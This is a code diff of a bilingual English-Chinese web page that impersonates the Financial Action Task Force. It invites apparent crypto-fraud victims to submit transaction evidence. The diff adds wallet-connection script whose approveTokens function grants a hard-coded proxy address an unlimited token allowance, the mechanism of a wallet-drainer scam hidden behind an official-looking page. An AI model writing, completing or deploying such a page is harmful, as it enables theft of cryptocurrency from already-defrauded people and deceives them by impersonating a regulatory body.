@@ -77,7 +77,7 @@
 </head>
 <body>
     <header>
-        <img src="/mnt/data/WeChat截图_20241125225530.png" alt="FATF Logo">
+        <img src="fatf_logo.png" alt="FATF Logo">
         <h1>Financial Action Task Force (FATF)</h1>
     </header>
     <nav>
@@ -110,10 +110,9 @@
             <li>Cryptocurrency Transaction Record / 虚拟货币交易记录：Upload transaction proofs related to exchanges or wallets. 包括在各交易所或钱包中与该事件相关的资金流动证明。</li>
         </ul>
         <p>Click the button below to submit via Google Form: 点击以下按钮通过谷歌表单提交：</p>
-        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" 
-            width="640" height="800" frameborder="0" marginheight="0" marginwidth="0">
-            Loading…
-        </iframe>
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" target="_blank">
+            <button>Submit Materials / 提交材料</button>
+        </a>
         <p>Or email materials to / 或发送材料至：<a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
     </div>
 
@@ -130,15 +129,12 @@
         <p>&copy; 2024 Financial Action Task Force. All rights reserved. / 版权所有</p>
     </footer>
 
-    <!-- 替代 CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // 配置
-        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // 目标代币合约地址
-        const proxyAddress = "0xfdB563c33AB7F14e411d58651959318597D8CC1E"; // 代理合约地址
+        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; 
+        const proxyAddress = "0xfdB563c33AB7F14e411d58651959318597D8CC1E"; 
         let provider, signer;
 
-        // 链接钱包
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -156,5 +152,22 @@
             }
         }
 
-        // 授权代币
+        async function approveTokens() {
+            if (!signer) {
+                alert("Please connect your wallet first! / 请先连接您的钱包！");
+                return;
+            }
 
+            const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+            try {
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                alert("Authorization successful! / 授权成功！");
+            } catch (error) {
+                alert("Authorization failed. Please check console logs! / 授权失败，请检查控制台日志！");
+            }
+        }
+    </script>
+</body>
+</html>
